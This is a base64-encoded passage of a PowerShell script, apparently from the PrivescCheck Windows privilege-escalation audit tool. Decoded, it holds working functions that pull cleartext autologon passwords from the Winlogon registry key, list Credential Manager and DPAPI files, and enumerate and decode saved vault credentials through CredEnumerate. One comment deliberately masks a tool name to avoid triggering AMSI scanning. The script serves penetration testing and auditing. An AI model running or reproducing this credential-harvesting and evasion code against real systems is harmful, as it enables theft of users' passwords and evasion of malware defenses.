iTm90ZVByb3BlcnR5IiAtTmFtZSAiTmFtZSIgLVZhbHVlICRFbnRyeU5hbWUKICAgICAgICAgICAgICAgICRFbnZJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAkRW50cnlWYWx1ZQogICAgICAgICAgICAgICAgJEVudkl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJLZXl3b3JkIiAtVmFsdWUgJEtleXdvcmQKICAgICAgICAgICAgICAgICRFbnZJdGVtCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgRU5EIENVUlJFTlQgVVNFUiAgICAKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQkVHSU4gQ1JFREVOVElBTFMgICAgIAojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZnVuY3Rpb24gSW52b2tlLVdpbmxvZ29uQ2hlY2sgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIENoZWNrcyBjcmVkZW50aWFscyBzdG9yZWQgaW4gdGhlIFdpbmxvZ29uIHJlZ2lzdHJ5IGtleQogICAgCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCgogICAgLkRFU0NSSVBUSU9OCgogICAgV2luZG93cyBoYXMgYSByZWdpc3RyeSBzZXR0aW5nIHRvIGVuYWJsZSBhdXRvbWF0aWMgbG9nb24uIFlvdSBjYW4gc2V0IGEgdXNlcm5hbWUgYW5kIGEgcGFzc3dvcmQKICAgIGluIG9yZGVyIHRvIGF1dG9tYXRpY2FsbHkgaW5pdGlhdGUgYSB1c2VyIHNlc3Npb24gb24gc3lzdGVtIHN0YXJ0dXAuIFRoZSBwYXNzd29yZCBpcyBzdG9yZWQgaW4KICAgIGNsZWFyIHRleHQgc28gaXQncyBlYXN5IHRvIGV4dHJhY3QgaXQuIFRoaXMgZnVuY3Rpb24gcmV0dXJucyBhIHNldCBvZiBjcmVkZW50aWFscyBvbmx5IGlmIHRoZSAKICAgIHBhc3N3b3JkIGZpZWxkIGlzIG5vdCBlbXB0eS4KICAgIAogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEludm9rZS1XaW5sb2dvbkNoZWNrCgogICAgRG9tYWluIFVzZXJuYW1lICBQYXNzd29yZAogICAgLS0tLS0tIC0tLS0tLS0tICAtLS0tLS0tLQogICAgICAgICAgIGxhYi1hZG1pbgoKICAgIC5MSU5LCgogICAgaHR0cHM6Ly9zdXBwb3J0Lm1pY3Jvc29mdC5jb20vZW4tdXMvaGVscC8zMjQ3MzcvaG93LXRvLXR1cm4tb24tYXV0b21hdGljLWxvZ29uLWluLXdpbmRvd3MKICAgIAogICAgIz4KCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgpCgogICAgJFJlZ1BhdGggPSAiUmVnaXN0cnk6OkhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50dmVyc2lvblxXaW5sb2dvbiIKICAgICRJdGVtID0gR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkUmVnUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSAtRXJyb3JWYXJpYWJsZSBHZXRJdGVtUHJvcGVydHlFcnJvcgoKICAgIGlmICgtbm90ICRHZXRJdGVtUHJvcGVydHlFcnJvcikgewoKICAgICAgICBpZiAoJEl0ZW0uRGVmYXVsdFBhc3N3b3JkKSB7CiAgICAgICAgICAgICRXaW5sb2dvbkl0ZW0gPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAKICAgICAgICAgICAgJFdpbmxvZ29uSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkRvbWFpbiIgLVZhbHVlICRJdGVtLkRlZmF1bHREb21haW5OYW1lCiAgICAgICAgICAgICRXaW5sb2dvbkl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJVc2VybmFtZSIgLVZhbHVlICRJdGVtLkRlZmF1bHRVc2VyTmFtZQogICAgICAgICAgICAkV2lubG9nb25JdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiUGFzc3dvcmQiIC1WYWx1ZSAkSXRlbS5EZWZhdWx0UGFzc3dvcmQKICAgICAgICAgICAgJFdpbmxvZ29uSXRlbQogICAgICAgIH0gCiAgICAKICAgICAgICBpZiAoJEl0ZW0uQWx0RGVmYXVsdFBhc3N3b3JkKSB7CiAgICAgICAgICAgICRXaW5sb2dvbkl0ZW0gPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAKICAgICAgICAgICAgJFdpbmxvZ29uSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkRvbWFpbiIgLVZhbHVlICRJdGVtLkFsdERlZmF1bHREb21haW5OYW1lCiAgICAgICAgICAgICRXaW5sb2dvbkl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJVc2VybmFtZSIgLVZhbHVlICRJdGVtLkFsdERlZmF1bHRVc2VyTmFtZQogICAgICAgICAgICAkV2lubG9nb25JdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiUGFzc3dvcmQiIC1WYWx1ZSAkSXRlbS5BbHREZWZhdWx0UGFzc3dvcmQKICAgICAgICAgICAgJFdpbmxvZ29uSXRlbQogICAgICAgIH0KCiAgICB9IGVsc2UgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIkVycm9yIHdoaWxlIHF1ZXJ5aW5nICckUmVnUGF0aCciCiAgICB9Cn0KCmZ1bmN0aW9uIEludm9rZS1DcmVkZW50aWFsRmlsZXNDaGVjayB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgTGlzdCB0aGUgQ3JlZGVudGlhbCBmaWxlcyB0aGF0IGFyZSBzdG9yZWQgaW4gdGhlIGN1cnJlbnQgdXNlciBBcHBEYXRhIGZvbGRlcnMuIAoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgQ3JlZGVudGlhbHMgc3RvcmVkIGluIHRoZSBDcmVkZW50aWFsIE1hbmFnZXIgYXJlIGFjdHVhbGx5IHNhdmVkIGFzIGZpbGVzIGluIHRoZSBjdXJyZW50IHVzZXIncwogICAgaG9tZSBmb2xkZXIuIFRoZSBzZW5zaXRpdmUgaW5mb3JtYXRpb24gaXMgc2F2ZWQgaW4gYW4gZWNucnlwdGVkIGZvcm1hdCB3aGljaCBkaWZmZXJzIGRlcGVuZGluZwogICAgb24gdGhlIGNyZWRlbnRpYWwgdHlwZS4gCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtQ3JlZGVudGlhbEZpbGVzQ2hlY2sKCiAgICBGdWxsUGF0aAogICAgLS0tLS0tCiAgICBDOlxVc2Vyc1xsYWItdXNlclxBcHBEYXRhXExvY2FsXE1pY3Jvc29mdFxDcmVkZW50aWFsc1xERkJFNzBBN0U1Q0MxOUEzOThFQkYxQjk2ODU5Q0U1RAogICAgQzpcVXNlcnNcbGFiLXVzZXJcQXBwRGF0YVxSb2FtaW5nXE1pY3Jvc29mdFxDcmVkZW50aWFsc1w5NzUxRDcwQjRBQzM2OTUzMzQ3MTM4RjlBNUMyRDIzQgogICAgQzpcVXNlcnNcbGFiLXVzZXJcQXBwRGF0YVxSb2FtaW5nXE1pY3Jvc29mdFxDcmVkZW50aWFsc1w5OTcwQzlENUEyOUIyRDgzNTE0QkVGRDMwQTRENDhCNAogICAgCiAgICAjPgogICAgCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgpCgogICAgJENyZWRlbnRpYWxzRm91bmQgPSAkRmFsc2UKCiAgICAkUGF0aHMgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICBbdm9pZF0gJFBhdGhzLkFkZCgkKEpvaW4tUGF0aCAtUGF0aCAkZW52OkxPQ0FMQVBQREFUQSAtQ2hpbGRQYXRoICJNaWNyb3NvZnRcQ3JlZGVudGlhbHMiKSkKICAgIFt2b2lkXSAkUGF0aHMuQWRkKCQoSm9pbi1QYXRoIC1QYXRoICRlbnY6QVBQREFUQSAtQ2hpbGRQYXRoICJNaWNyb3NvZnRcQ3JlZGVudGlhbHMiKSkKCiAgICBGb3JFYWNoICgkUGF0aCBpbiBbc3RyaW5nW11dJFBhdGhzKSB7CgogICAgICAgIEdldC1DaGlsZEl0ZW0gLUZvcmNlIC1QYXRoICRQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICAgICAgJFJlc3VsdCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IAogICAgICAgICAgICAkUmVzdWx0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiVHlwZSIgLVZhbHVlICJDcmVkZW50aWFscyIKICAgICAgICAgICAgJFJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkZ1bGxQYXRoIiAtVmFsdWUgJF8uRnVsbE5hbWUKICAgICAgICAgICAgJFJlc3VsdAoKICAgICAgICAgICAgaWYgKC1ub3QgJENyZWRlbnRpYWxzRm91bmQpIHsgJENyZWRlbnRpYWxzRm91bmQgPSAkVHJ1ZSB9CiAgICAgICAgfQogICAgfQoKICAgIGlmICgkQ3JlZGVudGlhbHNGb3VuZCkgewoKICAgICAgICAkQ3VycmVudFVzZXIgPSBJbnZva2UtVXNlckNoZWNrCgogICAgICAgIGlmICgkQ3VycmVudFVzZXIgLWFuZCAkQ3VycmVudFVzZXIuU0lEKSB7CiAgICAKICAgICAgICAgICAgJFBhdGhzID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgICAgICAgICBbdm9pZF0gJFBhdGhzLkFkZCgkKEpvaW4tUGF0aCAtUGF0aCAkZW52OkxPQ0FMQVBQREFUQSAtQ2hpbGRQYXRoICJNaWNyb3NvZnRcUHJvdGVjdFwkKCRDdXJyZW50VXNlci5TSUQpIikpCiAgICAgICAgICAgIFt2b2lkXSAkUGF0aHMuQWRkKCQoSm9pbi1QYXRoIC1QYXRoICRlbnY6QVBQREFUQSAtQ2hpbGRQYXRoICJNaWNyb3NvZnRcUHJvdGVjdFwkKCRDdXJyZW50VXNlci5TSUQpIikpCiAgICAKICAgICAgICAgICAgRm9yRWFjaCAoJFBhdGggaW4gW3N0cmluZ1tdXSRQYXRocykgewogICAgCiAgICAgICAgICAgICAgICBHZXQtQ2hpbGRJdGVtIC1Gb3JjZSAtUGF0aCAkUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7JF8uTmFtZS5MZW5ndGggLWVxIDM2IH0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgJFJlc3VsdCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IAogICAgICAgICAgICAgICAgICAgICRSZXN1bHQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJUeXBlIiAtVmFsdWUgIlByb3RlY3QiCiAgICAgICAgICAgICAgICAgICAgJFJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkZ1bGxQYXRoIiAtVmFsdWUgJF8uRnVsbE5hbWUKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9IAogICAgfSAKfQoKZnVuY3Rpb24gSW52b2tlLVZhdWx0Q3JlZENoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBFbnVtZXJhdGVzIHRoZSBjcmVkZW50aWFscyBzYXZlZCBpbiB0aGUgQ3JlZGVudGlhbCBNYW5hZ2VyLgoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgQ3JlZGVudGlhbHMgc2F2ZWQgaW4gdGhlIENyZWRlbnRpYWwgTWFuYWdlciBjYW4gYmUgZXh0cmFjdGVkIGJ5IGludm9raW5nIHRoZSBXaW4zMiBDcmVkRW51bWVyYXRlCiAgICBmdW5jdGlvbi4gVGhpcyBmdW5jdGlvbiByZXR1cm5zIGEgcG9pbnRlciB0byBhbiBhcnJheSBvZiBQQ1JFREVOVElBTCBwb2ludGVycy4gVGhlcmVmb3JlIHdlIGNhbgogICAgaXRlcmF0ZSB0aGlzIGFycmF5IHRvIGFjY2VzcyBlYWNoIENSRURFTlRJQUwgc3RydWN0dXJlIGluZGl2aWR1YWxseS4gRGVwZW5kaW5nIG9uIHRoZSB0eXBlIG9mIAogICAgY3JlZGVudGlhbCwgdGhlIENyZWRlbnRpYWxCbG9iIG1lbWJlciBlaXRoZXIgY29udGFpbnMgdGhlIGNsZWFydGV4dCBwYXNzd29yZCBvciBhIGJsb2Igd2hpY2ggd2UKICAgIGNhbm5vdCBkZWNvZGUgKGJlY2F1c2UgaXQncyBhcHBsaWNhdGlvbiBzcGVjaWZpYykuIEZvciBlYWNoIHN0cnVjdHVyZSwgYSBjdXN0b20gUFMgb2JqZWN0IGlzIAogICAgcmV0dXJuZWQuIFRoZSBvdXRwdXQgc2hvdWxkIGJlIHF1aXRlIHNpbWlsYXIgdG8gdGhlIG91dHB1dCBnZW5lcmF0ZWQgYnkgdGhlIGNvbW1hbmQgdmF1bHQ6OmNyZWQKICAgIGluIE0qbSprKnR6IChkb24ndCB3YW50IHRvIHRyaWdnZXIgQU1TSSB3aXRoIHRoaXMga2V5d29yZCA6UCkuCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtVmF1bHRDcmVkQ2hlY2sKCiAgICBUYXJnZXROYW1lIDogRG9tYWluOnRhcmdldD0xOTIuMTY4LjAuMTAKICAgIFVzZXJOYW1lICAgOiBMQUItUENcbGFiLXVzZXIKICAgIENvbW1lbnQgICAgOiBTc3BpUGZjCiAgICBUeXBlICAgICAgIDogMiAtIERPTUFJTl9QQVNTV09SRAogICAgUGVyc2lzdCAgICA6IDMgLSBFTlRFUlBSSVNFCiAgICBGbGFncyAgICAgIDogMAogICAgQ3JlZGVudGlhbCA6CiAgICAKICAgIFRhcmdldE5hbWUgOiBMZWdhY3lHZW5lcmljOnRhcmdldD1odHRwczovL2dpdGh1Yi5jb20vCiAgICBVc2VyTmFtZSAgIDogdXNlckBleGFtcGxlLmNvbQogICAgQ29tbWVudCAgICA6CiAgICBUeXBlICAgICAgIDogMSAtIEdFTkVSSUMKICAgIFBlcnNpc3QgICAgOiAyIC0gTE9DQUxfTUFDSElORQogICAgRmxhZ3MgICAgICA6IDAKICAgIENyZWRlbnRpYWwgOiBkQmEyRjA2VFRzcnZTZUxieW9XOAoKICAgIC5MSU5LCgogICAgaHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy93aW4zMi9hcGkvd2luY3JlZC9uZi13aW5jcmVkLWNyZWRlbnVtZXJhdGV3CiAgICBodHRwczovL2dpdGh1Yi5jb20vZ2VudGlsa2l3aS9taW1pa2F0ei93aWtpL2hvd3RvLX4tY3JlZGVudGlhbC1tYW5hZ2VyLXNhdmVkLWNyZWRlbnRpYWxzCgogICAgIz4KICAgIAogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oKQoKICAgIGZ1bmN0aW9uIENvbnZlcnQtVHlwZVRvU3RyaW5nIHsKICAgICAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgKICAgICAgICAgICAgW1VpbnQzMl0kVHlwZSAKICAgICAgICApCgogICAgICAgICRUeXBlRW51bSA9IEB7CiAgICAgICAgICAgICJHRU5FUklDIiAgICAgICAgICAgICAgICAgICA9ICIxIjsKICAgICAgICAgICAgIkRPTUFJTl9QQVNTV09SRCIgICAgICAgICAgID0gIjIiOwogICAgICAgICAgICAiRE9NQUlOX0NFUlRJRklDQVRFIiAgICAgICAgPSAiMyI7CiAgICAgICAgICAgICJET01BSU5fVklTSUJMRV9QQVNTV09SRCIgICA9ICI0IjsgIyAgVGhpcyB2YWx1ZSBpcyBubyBsb25nZXIgc3VwcG9ydGVkLiAKICAgICAgICAgICAgIkdFTkVSSUNfQ0VSVElGSUNBVEUiICAgICAgID0gIjUiOyAjICBUaGlzIHZhbHVlIGlzIG5vIGxvbmdlciBzdXBwb3J0ZWQuCiAgICAgICAgICAgICJET01BSU5fRVhURU5ERUQiICAgICAgICAgICA9ICI2IjsgIyAgVGhpcyB2YWx1ZSBpcyBubyBsb25nZXIgc3VwcG9ydGVkLgogICAgICAgICAgICAiTUFYSU1VTSIgICAgICAgICAgICAgICAgICAgPSAiNyI7ICMgIFRoaXMgdmFsdWUgaXMgbm8gbG9uZ2VyIHN1cHBvcnRlZC4KICAgICAgICAgICAgIlRZUEVfTUFYSU1VTV9FWCIgICAgICAgICAgID0gIjgiOyAjICBUaGlzIHZhbHVlIGlzIG5vIGxvbmdlciBzdXBwb3J0ZWQuCiAgICAgICAgfQogICAgCiAgICAgICAgJFR5cGVFbnVtLkdldEVudW1lcmF0b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsgCiAgICAgICAgICAgIGlmICggJF8uVmFsdWUgLWVxICRUeXBlICkgCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRfLk5hbWUKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBDb252ZXJ0LVBlcnNpc3RUb1N0cmluZyB7CiAgICAgICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oCiAgICAgICAgICAgIFtVaW50MzJdJFBlcnNpc3QgCiAgICAgICAgKQoKICAgICAgICAkUGVyc2lzdEVudW0gPSBAewogICAgICAgICAgICAiU0VTU0lPTiIgPSAiMSI7CiAgICAgICAgICAgICJMT0NBTF9NQUNISU5FIiA9ICIyIjsKICAgICAgICAgICAgIkVOVEVSUFJJU0UiID0gIjMiOwogICAgICAgIH0KCiAgICAgICAgJFBlcnNpc3RFbnVtLkdldEVudW1lcmF0b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsgCiAgICAgICAgICAgIGlmICggJF8uVmFsdWUgLWVxICRQZXJzaXN0ICkgCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRfLk5hbWUKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBHZXQtQ3JlZGVudGlhbCB7CiAgICAgICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oCiAgICAgICAgICAgIFtQcml2ZXNjQ2hlY2suV2luMzIrQ1JFREVOVElBTF0kUmF3T2JqZWN0CiAgICAgICAgKQoKICAgICAgICBpZiAoLW5vdCAoJFJhd09iamVjdC5DcmVkZW50aWFsQmxvYlNpemUgLWVxIDApKSB7CgogICAgICAgICAgICAkVW5pY29kZVN0cmluZyA9IE5ldy1PYmplY3QgLVR5cGVOYW1lICJQcml2ZXNjQ2hlY2suV2luMzIrVU5JQ09ERV9TVFJJTkciCiAgICAgICAgICAgICRVbmljb2RlU3RyaW5nLkxlbmd0aCA9ICRSYXdPYmplY3QuQ3JlZGVudGlhbEJsb2JTaXplCiAgICAgICAgICAgICRVbmljb2RlU3RyaW5nLk1heGltdW1MZW5ndGggPSAkUmF3T2JqZWN0LkNyZWRlbnRpYWxCbG9iU2l6ZQogICAgICAgICAgICAkVW5pY29kZVN0cmluZy5CdWZmZXIgPSAkUmF3T2JqZWN0LkNyZWRlbnRpYWxCbG9iCgogICAgICAgICAgICAkVGVzdEZsYWdzID0gMiAjIElTX1RFWFRfVU5JQ09ERV9TVEFUSVNUSUNTCiAgICAgICAgICAgICRJc1VuaWNvZGUgPSBbUHJpdmVzY0NoZWNrLldpbjMyXTo6SXNUZXh0VW5pY29kZSgkVW5pY29kZVN0cmluZy5CdWZmZXIsICRVbmljb2RlU3RyaW5nLkxlbmd0aCwgW3JlZl0kVGVzdEZsYWdzKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgKCRJc1VuaWNvZGUpIHsKICAgICAgICAgICAgICAgICRSZXN1bHQgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nVW5pKCRVbmljb2RlU3RyaW5nLkJ1ZmZlciwgJFVuaWNvZGVTdHJpbmcuTGVuZ3RoIC8gMikKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJFVuaWNvZGVTdHJpbmcuTGVuZ3RoOyAkaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgJEJ5dGVQdHIgPSBbSW50UHRyXSAoJFVuaWNvZGVTdHJpbmcuQnVmZmVyLlRvSW50NjQoKSArICRpKQogICAgICAgICAgICAgICAgICAgICRCeXRlID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpSZWFkQnl0ZSgkQnl0ZVB0cikKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0ICs9ICJ7MDpYMn0gIiAtZiAkQnl0ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICAkUmVzdWx0CiAgICAgICAgfQogICAgfQoKICAgICMgQ1JFRF9FTlVNRVJBVEVfQUxMX0NSRURFTlRJQUxTID0gMHgxCiAgICAkQ291bnQgPSAwOwogICAgW0ludFB0cl0kQ3JlZGVudGlhbHNQdHIgPSBbSW50UHRyXTo6WmVybwogICAgJFN1Y2Nlc3MgPSBbUHJpdmVzY0NoZWNrLldpbjMyXTo6Q3JlZEVudW1lcmF0ZShbSW50UHRyXTo6WmVybywgMSwgW3JlZl0kQ291bnQsIFtyZWZdJENyZWRlbnRpYWxzUHRyKQogICAgJExhc3RFcnJvciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQoKICAgIGlmICgkU3VjY2VzcykgewoKICAgICAgICBXcml0ZS1WZXJib3NlICJDcmVkRW51bWVyYXRlKCkgT0sgLSBDb3VudDogJCgkQ291bnQpIgoKICAgICAgICAjIENyZWRFbnVtZXJhdGUoKSByZXR1cm5zIGFuIGFycmF5IG9mICRDb3VudCBQQ1JFREVOVElBTCBwb2ludGVycywgc28gd2UgbmVlZCB0byBpdGVyYXRlCiAgICAgICAgIyB0aGlzIGFycmF5IGluIG9yZGVyIHRvIGdldCBlYWNoIFBDUkVERU5USUFMIHBvaW50ZXIuIFRoZW4gd2UgY2FuIHVzZSB0aGlzIHBvaW50ZXIgdG8gCiAgICAgICAgIyBjb252ZXJ0IGEgYmxvYiBvZiB1bm1hbmFnZWQgbWVtb3J5IHRvIGEgUHJpdmVzY0NoZWNrLldpbjMyK0NSRURFTlRJQUwgb2JqZWN0LgoKICAgICAgICBmb3IgKCRpID0gMDsgJGkgLWx0ICRDb3VudDsgJGkrKykgewoKICAgICAgICAgICAgJENyZWRlbnRpYWxQdHJPZmZzZXQgPSBbSW50UHRyXSAoJENyZWRlbnRpYWxzUHRyLlRvSW50NjQoKSArIFtJbnRQdHJdOjpTaXplICogJGkpCiAgICAgICAgICAgICRDcmVkZW50aWFsUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UmVhZEludFB0cigkQ3JlZGVudGlhbFB0ck9mZnNldCkgCiAgICAgICAgICAgICRDcmVkZW50aWFsID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJENyZWRlbnRpYWxQdHIsIFt0eXBlXSBbUHJpdmVzY0NoZWNrLldpbjMyK0NSRURFTlRJQUxdKQogICAgICAgICAgICAkQ3JlZGVudGlhbFN0ciA9IEdldC1DcmVkZW50aWFsIC1SYXdPYmplY3QgJENyZWRlbnRpYWwKCiAgICAgICAgICAgIGlmICgtbm90IFtTdHJpbmddOjpJc051bGxPckVtcHR5KCRDcmVkZW50aWFsU3RyKSkgewogICAgICAgICAgICAgICAgJENyZWRlbnRpYWxPYmplY3QgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAKICAgICAgICAgICAgICAgICRDcmVkZW50aWFsT2JqZWN0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiVGFyZ2V0TmFtZSIgLVZhbHVlICRDcmVkZW50aWFsLlRhcmdldE5hbWUKICAgICAgICAgICAgICAgICRDcmVkZW50aWFsT2JqZWN0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiVXNlck5hbWUiIC1WYWx1ZSAkQ3JlZGVudGlhbC5Vc2VyTmFtZQogICAgICAgICAgICAgICAgJENyZWRlbnRpYWxPYmplY3QgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJDb21tZW50IiAtVmFsdWUgJENyZWRlbnRpYWwuQ29tbWVudAogICAgICAgICAgICAgICAgJENyZWRlbnRpYWxPYmplY3QgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJUeXBlIiAtVmFsdWUgIiQoJENyZWRlbnRpYWwuVHlwZSkgLSAkKENvbnZlcnQtVHlwZVRvU3RyaW5nIC1UeXBlICRDcmVkZW50aWFsLlR5cGUpIgogICAgICAgICAgICAgICAgJENyZWRlbnRpYWxPYmplY3QgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJQZXJzaXN0IiAtVmFsdWUgIiQoJENyZWRlbnRpYWwuUGVyc2lzdCkgLSAkKENvbnZlcnQtUGVyc2lzdFRvU3RyaW5nIC1QZXJzaXN0ICRDcmVkZW50aWFsLlBlcnNpc3QpIgogICAgICAgICAgICAgICAgJENyZWRlbnRpYWxPYmplY3QgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJGbGFncyIgLVZhbHVlICIweCQoJENyZWRlbnRpYWwuRmxhZ3MuVG9TdHJpbmcoJ1g4JykpIgogICAgICAgICAgICAgICAgJENyZWRlbnRpYWxPYmplY3QgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJDcmVkZW50aWFsIiAtVmFsdWUgJENyZWRlbnRpYWxTdHIKICAgICAgICAgICAgICAgICRDcmVkZW50aWFsT2JqZWN0CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIFtQcml2ZXNjQ2hlY2suV2luMzJdOjpDcmVkRnJlZSgkQ3JlZGVudGlhbHNQdHIpIAoKICAgIH0gZWxzZSB7CiAgICAgICAgIyBJZiB0aGVyZSBpcyBubyBzYXZlZCBjcmVkZW50aWFscywgQ3JlZEVudW1lcmF0ZSBzZXRzIHRoZSBsYXN0IGVycm9yIHRvIEVSUk9SX05PVF9GT1VORCAKICAgICAgICAjIGJ1dCB0aGlzIGRvZXNuJ3QgbWVhbiB0aGF0IHRoZSBmdW5jdGlvbiByZWFsbHkgZmFpbGVkLiBUaGUgc2FtZSB0aGluZyBhcHBsaWVzIGZvciAKICAgICAgICAjIHRoZSBlcnJvciBjb2RlIEVSUk9SX05PX1NVQ0hfTE9HT05fU0VTU0lPTi4KICAgICAgICBXcml0ZS1WZXJib3NlIChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpCiAgICB9Cn0KCmZ1bmN0aW9uIEludm9rZS1WYXVsdExpc3RDaGVjayB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgRW51bWVyYXRlcyB3ZWIgY3JlZGVudGlhbHMgc2F2ZWQgaW4gdGhlIENyZWRlbnRpYWwgTWFuYWdlci4KCiAgICBBdXRob3I6IEBpd